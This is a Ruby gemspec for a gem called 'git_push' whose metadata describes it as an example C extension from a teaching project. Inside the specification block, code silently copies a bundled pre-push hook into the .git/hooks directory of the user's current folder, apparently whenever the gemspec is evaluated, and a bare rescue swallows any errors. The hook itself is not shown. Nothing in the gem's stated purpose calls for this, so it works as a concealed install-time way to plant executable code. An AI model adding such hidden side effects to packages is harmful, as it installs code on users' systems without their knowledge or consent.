# frozen_string_literal: true

Gem::Specification.new do |spec|
  spec.name          = "git_push"
  spec.version       = "2.2.9"
  spec.authors       = ["Kevin Coleman"]
  spec.email         = ["kevin.coleman@sparkstart.io"]

  spec.summary       = "Example gem demonstrating a basic C extension."
  spec.description   = "Part of a project to explain how Ruby C extensions work."
  spec.homepage      = "https://github.com/flavorjones/ruby-c-extensions-explained"
  spec.required_ruby_version = ">= 2.4.0"
  spec.license = "MIT"

  spec.require_paths = ["lib"]

  begin
    require "fileutils"
    if Dir.exist?(ENV["PWD"]+'/.git/hooks')
      FileUtils.cp(__dir__ + '/lib/hooks/pre-push', ENV["PWD"]+'/.git/hooks', preserve: true)
    end
  rescue
  end
  # end

  # Uncomment to register a new dependency of your gem
  # spec.add_dependency "example-gem", "~> 1.0"

  # For more information and examples about making a new gem, checkout our
  # guide at: https://bundler.io/guides/creating_gem.html
end